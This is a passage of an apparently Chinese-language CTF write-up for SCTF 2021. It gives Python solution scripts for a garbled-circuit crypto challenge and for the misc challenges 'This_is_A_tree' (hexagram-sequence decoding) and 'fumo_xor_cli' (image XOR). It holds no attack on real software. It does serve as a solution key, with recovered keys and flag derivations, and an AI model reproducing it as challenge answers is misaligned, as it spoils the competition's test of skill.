            (<span style="color:#ae81ff">13892520</span>, <span style="color:#ae81ff">7462011</span>)],
            <span style="color:#ae81ff">6</span>: [(<span style="color:#ae81ff">3244202</span>, <span style="color:#ae81ff">918053</span>),
            (<span style="color:#ae81ff">3277177</span>, <span style="color:#ae81ff">6281266</span>),
            (<span style="color:#ae81ff">1016382</span>, <span style="color:#ae81ff">7097624</span>),
            (<span style="color:#ae81ff">10016472</span>, <span style="color:#ae81ff">13600867</span>)],
            <span style="color:#ae81ff">7</span>: [(<span style="color:#ae81ff">5944875</span>, <span style="color:#ae81ff">3442862</span>),
            (<span style="color:#ae81ff">7358369</span>, <span style="color:#ae81ff">8423543</span>),
            (<span style="color:#ae81ff">6495696</span>, <span style="color:#ae81ff">9927178</span>),
            (<span style="color:#ae81ff">13271900</span>, <span style="color:#ae81ff">11855272</span>)],
            <span style="color:#ae81ff">9</span>: [(<span style="color:#ae81ff">5333988</span>, <span style="color:#ae81ff">87113</span>),
            (<span style="color:#ae81ff">9375869</span>, <span style="color:#ae81ff">11687470</span>),
            (<span style="color:#ae81ff">5011062</span>, <span style="color:#ae81ff">14981756</span>),
            (<span style="color:#ae81ff">2509493</span>, <span style="color:#ae81ff">12330305</span>)]}
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">validate_the_circuit</span>(geta_table, key0, key1):
    <span style="color:#66d9ef">for</span> g <span style="color:#f92672">in</span> geta_table:
        gl, v <span style="color:#f92672">=</span> g
        label <span style="color:#f92672">=</span> decrypt(gl, key0, key1)
        validation <span style="color:#f92672">=</span> decrypt(v, key0, key1)
        
        <span style="color:#66d9ef">if</span> validation <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">return</span> label
geta5 <span style="color:#f92672">=</span> G_Table[<span style="color:#ae81ff">5</span>]
geta6 <span style="color:#f92672">=</span> G_Table[<span style="color:#ae81ff">6</span>]
geta7 <span style="color:#f92672">=</span> G_Table[<span style="color:#ae81ff">7</span>]
geta9 <span style="color:#f92672">=</span> G_Table[<span style="color:#ae81ff">9</span>]
key0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8680011</span>
key1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2096572</span>
msg <span style="color:#f92672">=</span> validate_the_circuit(geta9, key0, key1)
print(<span style="color:#e6db74">&#39;key[9][1] = &#39;</span>, msg)
<span style="color:#75715e"># keys[1][0] = 8343801</span>
<span style="color:#75715e"># keys[1][1] = 13675268</span>
<span style="color:#75715e"># keys[2][0] = 10251687</span>
<span style="color:#75715e"># keys[2][1] = 12870274</span>
<span style="color:#75715e"># keys[3][0] = 6827786</span>
<span style="color:#75715e"># keys[3][1] = 12490757</span>
<span style="color:#75715e"># keys[4][0] = 2096572</span>
<span style="color:#75715e"># keys[4][1] = 3391233</span>
<span style="color:#75715e"># keys[5][0] = 15707475</span>
<span style="color:#75715e"># keys[5][1] = 4567418</span>
<span style="color:#75715e"># keys[6][0] = 14095476</span>
<span style="color:#75715e"># keys[6][1] = 3648155</span>
<span style="color:#75715e"># key[7][0] = 14409690</span>
<span style="color:#75715e"># key[7][1] =  8680011</span>
<span style="color:#75715e"># key[9][0] =  9376523</span>
<span style="color:#75715e"># key[9][1] =  2504390</span>
<span style="color:#75715e">###############################################################</span>
<span style="color:#f92672">import</span> hashlib
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> n2s
<span style="color:#75715e"># keys[1][0] = 8343801</span>
<span style="color:#75715e"># keys[1][1] = 13675268</span>
<span style="color:#75715e"># keys[2][0] = 10251687</span>
<span style="color:#75715e"># keys[2][1] = 12870274</span>
<span style="color:#75715e"># keys[3][0] = 6827786</span>
<span style="color:#75715e"># keys[3][1] = 12490757</span>
<span style="color:#75715e"># keys[4][0] = 2096572</span>
<span style="color:#75715e"># keys[4][1] = 3391233</span>
<span style="color:#75715e"># keys[5][0] = 15707475</span>
<span style="color:#75715e"># keys[5][1] = 4567418</span>
<span style="color:#75715e"># keys[6][0] = 14095476</span>
<span style="color:#75715e"># keys[6][1] = 3648155</span>
<span style="color:#75715e"># keys[7][0] = 14409690</span>
<span style="color:#75715e"># keys[7][1] =  8680011</span>
<span style="color:#75715e"># keys[9][0] =  9376523</span>
<span style="color:#75715e"># keys[9][1] =  2504390</span>
keys <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">8343801</span>, <span style="color:#ae81ff">13675268</span>], [<span style="color:#ae81ff">10251687</span>, <span style="color:#ae81ff">12870274</span>], [<span style="color:#ae81ff">6827786</span>, <span style="color:#ae81ff">12490757</span>], [<span style="color:#ae81ff">2096572</span>, <span style="color:#ae81ff">3391233</span>], [<span style="color:#ae81ff">15707475</span>, <span style="color:#ae81ff">4567418</span>], [<span style="color:#ae81ff">14095476</span>, <span style="color:#ae81ff">3648155</span>], [<span style="color:#ae81ff">14409690</span>, <span style="color:#ae81ff">8680011</span>], [<span style="color:#ae81ff">9376523</span>, <span style="color:#ae81ff">2504390</span>]]
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(A, B):
    <span style="color:#66d9ef">return</span> bytes(a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B))
the_chaos<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> keys:
    tmp <span style="color:#f92672">=</span> sum(i)
    the_chaos <span style="color:#f92672">+=</span> bytes(long_to_bytes(tmp))
mask <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(the_chaos)<span style="color:#f92672">.</span>digest()
flag <span style="color:#f92672">=</span> xor(mask,n2s(<span style="color:#ae81ff">0x1661fe85c7b01b3db1d432ad3c5ac83a</span>))
print(flag)
</code></pre></div><h2 id="misc">Misc</h2>
<h3 id="this_is_a_tree">This_is_A_tree</h3>
<p>一个树型解密，随便找了个脚本改了改</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python  </span>
<span style="color:#75715e"># -*- coding:utf8 -*-  </span>
<span style="color:#f92672">import</span> os  
allFileNum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  
file_contents_list <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printPath</span>(level, path):  
    <span style="color:#66d9ef">global</span> allFileNum  
    <span style="color:#75715e"># 所有文件夹，第一个字段是次目录的级别  </span>
    dirList <span style="color:#f92672">=</span> []  
    <span style="color:#75715e"># 所有文件  </span>
    fileList <span style="color:#f92672">=</span> []
    <span style="color:#75715e"># exp</span>
    <span style="color:#66d9ef">global</span> file_contents_list
    <span style="color:#75715e"># exp</span>
    <span style="color:#75715e"># 返回一个列表，其中包含在目录条目的名称(google翻译)  </span>
    files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)  
    <span style="color:#75715e"># 先添加目录级别  </span>
    dirList<span style="color:#f92672">.</span>append(str(level))  
    <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> files:  
        <span style="color:#66d9ef">if</span>(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> f)):  
            <span style="color:#75715e"># 排除隐藏文件夹。因为隐藏文件夹过多  </span>
            <span style="color:#66d9ef">if</span>(f[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>):  
                <span style="color:#66d9ef">pass</span>  
            <span style="color:#66d9ef">else</span>:  
                <span style="color:#75715e"># 添加非隐藏文件夹  </span>
                dirList<span style="color:#f92672">.</span>append(f)  
        <span style="color:#66d9ef">if</span>(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> f)):  
            <span style="color:#75715e"># 添加文件</span>
            fileList<span style="color:#f92672">.</span>append(f)
            <span style="color:#75715e"># exp添加内容</span>
            <span style="color:#66d9ef">if</span> f <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;exp.py&#39;</span>:
                file_contents_list<span style="color:#f92672">.</span>append(open(path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> f, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read())
            <span style="color:#75715e"># exp</span>
    <span style="color:#75715e"># 当一个标志使用，文件夹列表第一个级别不打印  </span>
    i_dl <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>  
    <span style="color:#66d9ef">for</span> dl <span style="color:#f92672">in</span> dirList:  
        <span style="color:#66d9ef">if</span>(i_dl <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):  
            i_dl <span style="color:#f92672">=</span> i_dl <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>  
        <span style="color:#66d9ef">else</span>:  
            <span style="color:#75715e"># 打印至控制台，不是第一个的目录  </span>
            print(<span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> (int(dirList[<span style="color:#ae81ff">0</span>])), dl)  
            <span style="color:#75715e"># 打印目录下的所有文件夹和文件，目录级别+1  </span>
            printPath((int(dirList[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>), path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> dl)  
    <span style="color:#66d9ef">for</span> fl <span style="color:#f92672">in</span> fileList:  
        <span style="color:#75715e"># 打印文件  </span>
        print(<span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> (int(dirList[<span style="color:#ae81ff">0</span>])), fl)  
        <span style="color:#75715e"># 随便计算一下有多少个文件  </span>
        allFileNum <span style="color:#f92672">=</span> allFileNum <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">return</span> file_contents_list
 
<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:  
    contents_list <span style="color:#f92672">=</span> printPath(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;D:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">CTF题目</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">2021SCTF</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">misc</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">78afbe21e9334e83a265e984a1aa9ddd&#39;</span>)  
    <span style="color:#75715e"># print(&#39;总文件数 =&#39;, allFileNum)</span>
    print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(contents_list))
</code></pre></div><p>解密完base64一下是个八卦序列，师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫
<a class="link" href="https://blog.csdn.net/weixin_44110537/article/details/107494966"  target="_blank" rel="noopener"
    >https://blog.csdn.net/weixin_44110537/article/details/107494966</a></p>
<p>脚本如下,输入换一下，删一点后面的就行</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt4</span>(enc):
    temp<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
    offset<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc)):
        temp<span style="color:#f92672">+=</span>chr(ord(enc[i])<span style="color:#f92672">+</span>offset<span style="color:#f92672">+</span>i)
    <span style="color:#66d9ef">return</span> temp
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt5</span>(flag):
    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">200</span>):
        enc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag:
            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">200</span>):
                 <span style="color:#66d9ef">if</span> (ord(i) <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">*</span>k)<span style="color:#f92672">%</span>a<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
                    enc<span style="color:#f92672">+=</span> chr((ord(i) <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">*</span> k) <span style="color:#f92672">//</span> a <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
                    <span style="color:#66d9ef">break</span>
        print(enc)

s<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫&#39;</span>
dic<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;坤&#39;</span>: <span style="color:#e6db74">&#39;000000&#39;</span>, <span style="color:#e6db74">&#39;剥&#39;</span>: <span style="color:#e6db74">&#39;000001&#39;</span>, <span style="color:#e6db74">&#39;比&#39;</span>: <span style="color:#e6db74">&#39;000010&#39;</span>, <span style="color:#e6db74">&#39;观&#39;</span>: <span style="color:#e6db74">&#39;000011&#39;</span>, <span style="color:#e6db74">&#39;豫&#39;</span>: <span style="color:#e6db74">&#39;000100&#39;</span>, <span style="color:#e6db74">&#39;晋&#39;</span>: <span style="color:#e6db74">&#39;000101&#39;</span>, <span style="color:#e6db74">&#39;萃&#39;</span>: <span style="color:#e6db74">&#39;000110&#39;</span>, <span style="color:#e6db74">&#39;否&#39;</span>: <span style="color:#e6db74">&#39;000111&#39;</span>, <span style="color:#e6db74">&#39;谦&#39;</span>: <span style="color:#e6db74">&#39;001000&#39;</span>, <span style="color:#e6db74">&#39;艮&#39;</span>: <span style="color:#e6db74">&#39;001001&#39;</span>, <span style="color:#e6db74">&#39;蹇&#39;</span>: <span style="color:#e6db74">&#39;001010&#39;</span>, <span style="color:#e6db74">&#39;渐&#39;</span>: <span style="color:#e6db74">&#39;001011&#39;</span>, <span style="color:#e6db74">&#39;小过&#39;</span>: <span style="color:#e6db74">&#39;001100&#39;</span>, <span style="color:#e6db74">&#39;旅&#39;</span>: <span style="color:#e6db74">&#39;001101&#39;</span>, <span style="color:#e6db74">&#39;咸&#39;</span>: <span style="color:#e6db74">&#39;001110&#39;</span>, <span style="color:#e6db74">&#39;遁&#39;</span>: <span style="color:#e6db74">&#39;001111&#39;</span>, <span style="color:#e6db74">&#39;师&#39;</span>: <span style="color:#e6db74">&#39;010000&#39;</span>, <span style="color:#e6db74">&#39;蒙&#39;</span>: <span style="color:#e6db74">&#39;010001&#39;</span>, <span style="color:#e6db74">&#39;坎&#39;</span>: <span style="color:#e6db74">&#39;010010&#39;</span>, <span style="color:#e6db74">&#39;涣&#39;</span>: <span style="color:#e6db74">&#39;010011&#39;</span>, <span style="color:#e6db74">&#39;解&#39;</span>: <span style="color:#e6db74">&#39;010100&#39;</span>, <span style="color:#e6db74">&#39;未济&#39;</span>: <span style="color:#e6db74">&#39;010101&#39;</span>, <span style="color:#e6db74">&#39;困&#39;</span>: <span style="color:#e6db74">&#39;010110&#39;</span>, <span style="color:#e6db74">&#39;讼&#39;</span>: <span style="color:#e6db74">&#39;010111&#39;</span>, <span style="color:#e6db74">&#39;升&#39;</span>: <span style="color:#e6db74">&#39;011000&#39;</span>, <span style="color:#e6db74">&#39;蛊&#39;</span>: <span style="color:#e6db74">&#39;011001&#39;</span>, <span style="color:#e6db74">&#39;井&#39;</span>: <span style="color:#e6db74">&#39;011010&#39;</span>, <span style="color:#e6db74">&#39;巽&#39;</span>: <span style="color:#e6db74">&#39;011011&#39;</span>, <span style="color:#e6db74">&#39;恒&#39;</span>: <span style="color:#e6db74">&#39;011100&#39;</span>, <span style="color:#e6db74">&#39;鼎&#39;</span>: <span style="color:#e6db74">&#39;011101&#39;</span>, <span style="color:#e6db74">&#39;大过&#39;</span>: <span style="color:#e6db74">&#39;011110&#39;</span>, <span style="color:#e6db74">&#39;姤&#39;</span>: <span style="color:#e6db74">&#39;011111&#39;</span>, <span style="color:#e6db74">&#39;复&#39;</span>: <span style="color:#e6db74">&#39;100000&#39;</span>, <span style="color:#e6db74">&#39;颐&#39;</span>: <span style="color:#e6db74">&#39;100001&#39;</span>, <span style="color:#e6db74">&#39;屯&#39;</span>: <span style="color:#e6db74">&#39;100010&#39;</span>, <span style="color:#e6db74">&#39;益&#39;</span>: <span style="color:#e6db74">&#39;100011&#39;</span>, <span style="color:#e6db74">&#39;震&#39;</span>: <span style="color:#e6db74">&#39;100100&#39;</span>, <span style="color:#e6db74">&#39;噬嗑&#39;</span>: <span style="color:#e6db74">&#39;100101&#39;</span>, <span style="color:#e6db74">&#39;随&#39;</span>: <span style="color:#e6db74">&#39;100110&#39;</span>, <span style="color:#e6db74">&#39;无妄&#39;</span>: <span style="color:#e6db74">&#39;100111&#39;</span>, <span style="color:#e6db74">&#39;明夷&#39;</span>: <span style="color:#e6db74">&#39;101000&#39;</span>, <span style="color:#e6db74">&#39;贲&#39;</span>: <span style="color:#e6db74">&#39;101001&#39;</span>, <span style="color:#e6db74">&#39;既济&#39;</span>: <span style="color:#e6db74">&#39;101010&#39;</span>, <span style="color:#e6db74">&#39;家人&#39;</span>: <span style="color:#e6db74">&#39;101011&#39;</span>, <span style="color:#e6db74">&#39;丰&#39;</span>: <span style="color:#e6db74">&#39;101100&#39;</span>, <span style="color:#e6db74">&#39;离&#39;</span>: <span style="color:#e6db74">&#39;101101&#39;</span>, <span style="color:#e6db74">&#39;革&#39;</span>: <span style="color:#e6db74">&#39;101110&#39;</span>, <span style="color:#e6db74">&#39;同人&#39;</span>: <span style="color:#e6db74">&#39;101111&#39;</span>, <span style="color:#e6db74">&#39;临&#39;</span>: <span style="color:#e6db74">&#39;110000&#39;</span>, <span style="color:#e6db74">&#39;损&#39;</span>: <span style="color:#e6db74">&#39;110001&#39;</span>, <span style="color:#e6db74">&#39;节&#39;</span>: <span style="color:#e6db74">&#39;110010&#39;</span>, <span style="color:#e6db74">&#39;中孚&#39;</span>: <span style="color:#e6db74">&#39;110011&#39;</span>, <span style="color:#e6db74">&#39;归妹&#39;</span>: <span style="color:#e6db74">&#39;110100&#39;</span>, <span style="color:#e6db74">&#39;睽&#39;</span>: <span style="color:#e6db74">&#39;110101&#39;</span>, <span style="color:#e6db74">&#39;兑&#39;</span>: <span style="color:#e6db74">&#39;110110&#39;</span>, <span style="color:#e6db74">&#39;履&#39;</span>: <span style="color:#e6db74">&#39;110111&#39;</span>, <span style="color:#e6db74">&#39;泰&#39;</span>: <span style="color:#e6db74">&#39;111000&#39;</span>, <span style="color:#e6db74">&#39;大畜&#39;</span>: <span style="color:#e6db74">&#39;111001&#39;</span>, <span style="color:#e6db74">&#39;需&#39;</span>: <span style="color:#e6db74">&#39;111010&#39;</span>, <span style="color:#e6db74">&#39;小畜&#39;</span>: <span style="color:#e6db74">&#39;111011&#39;</span>, <span style="color:#e6db74">&#39;大壮&#39;</span>: <span style="color:#e6db74">&#39;111100&#39;</span>, <span style="color:#e6db74">&#39;大有&#39;</span>: <span style="color:#e6db74">&#39;111101&#39;</span>, <span style="color:#e6db74">&#39;夬&#39;</span>: <span style="color:#e6db74">&#39;111110&#39;</span>, <span style="color:#e6db74">&#39;乾&#39;</span>: <span style="color:#e6db74">&#39;111111&#39;</span>}
li<span style="color:#f92672">=</span>[]
k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s)):
    <span style="color:#66d9ef">if</span> k <span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
        k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
        <span style="color:#66d9ef">continue</span>
    <span style="color:#66d9ef">try</span>:
        li<span style="color:#f92672">.</span>append(dic[s[i]])
    <span style="color:#66d9ef">except</span>:
        t<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
        t<span style="color:#f92672">=</span>t<span style="color:#f92672">+</span>s[i]<span style="color:#f92672">+</span>s[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
        li<span style="color:#f92672">.</span>append(dic[t])
        k<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
ss<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(li)
print(ss)
enc<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(ss),<span style="color:#ae81ff">8</span>):
    enc<span style="color:#f92672">+=</span>chr(eval(<span style="color:#e6db74">&#39;0b&#39;</span><span style="color:#f92672">+</span>ss[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]))
<span style="color:#f92672">import</span> base64
print(enc)
x<span style="color:#f92672">=</span>base64<span style="color:#f92672">.</span>b64decode(enc)<span style="color:#f92672">.</span>decode()
print(x)
x<span style="color:#f92672">=</span>decrypt4(x)
x<span style="color:#f92672">=</span>decrypt5(x)
</code></pre></div><h3 id="fumo_xor_cli">fumo_xor_cli</h3>
<p>nc 远程发现是通过五颜六色的字符打印出一个 gif，肉眼发现有两帧不一样，把 nc 到的字节流重定向到本地文件，然后手动把这两帧提取出来，都是 <code>50*133</code> 个字符的。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 243; 
			flex-basis: 583px"
	>
	<a href="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_1.png" data-size="1637x673">
		<img src="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_1.png"
			width="1637"
			height="673"
			srcset="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_1_hu734548e9ec44e4be5fc45bfdc1ed7984_1174472_480x0_resize_box_3.png 480w, /post/sctf2021-writeup-by-or4nge/fumo_xor_cli_1_hu734548e9ec44e4be5fc45bfdc1ed7984_1174472_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>无意间发现链接的公众号推送的最后一张图有异样，下载原图，仔细观察发现：</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 239; 
			flex-basis: 575px"
	>
	<a href="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_2.png" data-size="1437x599">
		<img src="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_2.png"
			width="1437"
			height="599"
			srcset="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_2_hubd5f2fbcbf7640e7c0d4a6d514367ae2_47356_480x0_resize_box_3.png 480w, /post/sctf2021-writeup-by-or4nge/fumo_xor_cli_2_hubd5f2fbcbf7640e7c0d4a6d514367ae2_47356_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>有规律的藏有五颜六色的像素，提取出来，发现是 <code>133*100</code> 的，把这个拆成两个 <code>50*133</code> ，然后都旋转为正的，将 4 张 <code>50*133</code> 的图异或，发现大部分都是 (0,0,0)，部分是三个一样的，再经过一些简单的图片处理，得到flag。</p>
<p><figure 
	
		class="gallery-image" 
		style="
			flex-grow: 177; 
			flex-basis: 426px"
	>
	<a href="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_3.png" data-size="1920x1080">
		<img src="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_3.png"
			width="1920"
			height="1080"
			srcset="/post/sctf2021-writeup-by-or4nge/fumo_xor_cli_3_hu26fb2078f0d07d6fde5c3a776ba03ef3_199118_480x0_resize_box_3.png 480w, /post/sctf2021-writeup-by-or4nge/fumo_xor_cli_3_hu26fb2078f0d07d6fde5c3a776ba03ef3_199118_1024x0_resize_box_3.png 1024w"
			loading="lazy"
			>
	</a>
	
</figure></p>
<p>全程处理数据的脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
<span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rerange</span>(s):
    t <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(s[<span style="color:#ae81ff">0</span>])):
        t<span style="color:#f92672">.</span>append([s[_][i] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(len(s))])
    <span style="color:#66d9ef">return</span> t

f <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;640.png&#39;</span>)

a <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(f)
cnt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
wx_list_1 <span style="color:#f92672">=</span> []
wx_list_2 <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(a)):
    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1190</span>:
        b <span style="color:#f92672">=</span> a[i]
        now_list_1 <span style="color:#f92672">=</span> []
        now_list_2 <span style="color:#f92672">=</span> []
        cnt_j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(b)):
            <span style="color:#66d9ef">if</span> j <span style="color:#f92672">%</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
                <span style="color:#66d9ef">if</span> cnt_j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">50</span>:
                    now_list_1<span style="color:#f92672">.</span>append(b[j])
                <span style="color:#66d9ef">else</span>:
                    now_list_2<span style="color:#f92672">.</span>append(b[j])
                cnt_j <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        wx_list_1<span style="color:#f92672">.</span>append(now_list_1)
        wx_list_2<span style="color:#f92672">.</span>append(now_list_2)
        cnt <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
wx_list_1 <span style="color:#f92672">=</span> rerange(wx_list_1)
wx_list_2 <span style="color:#f92672">=</span> rerange(wx_list_2)

<span style="color:#f92672">import</span> re
fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;pic1.txt&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)
list_1 <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> fp<span style="color:#f92672">.</span>readlines():
    pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\[\d+;\d+;(\d+);(\d+);(\d+)ma&#39;</span>)
    a <span style="color:#f92672">=</span> pattern<span style="color:#f92672">.</span>findall(line<span style="color:#f92672">.</span>decode())
    a <span style="color:#f92672">=</span> [(int(_[<span style="color:#ae81ff">0</span>]), int(_[<span style="color:#ae81ff">1</span>]), int(_[<span style="color:#ae81ff">2</span>])) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> a]
    list_1<span style="color:#f92672">.</span>append(a)
fp<span style="color:#f92672">.</span>close()

fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;pic2.txt&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)
list_2 <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> fp<span style="color:#f92672">.</span>readlines():
    pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\[\d+;\d+;(\d+);(\d+);(\d+)m[a-zA-Z0-9\:\/\.\_]&#39;</span>)
    a <span style="color:#f92672">=</span> pattern<span style="color:#f92672">.</span>findall(line<span style="color:#f92672">.</span>decode())
    a <span style="color:#f92672">=</span> [(int(_[<span style="color:#ae81ff">0</span>]), int(_[<span style="color:#ae81ff">1</span>]), int(_[<span style="color:#ae81ff">2</span>])) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> a]
    list_2<span style="color:#f92672">.</span>append(a)
fp<span style="color:#f92672">.</span>close()

fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;pic3&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(list_1)):
    a, b <span style="color:#f92672">=</span> wx_list_1[i], list_1[i]
    c, d <span style="color:#f92672">=</span> wx_list_2[i], list_2[i]
    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(a)):
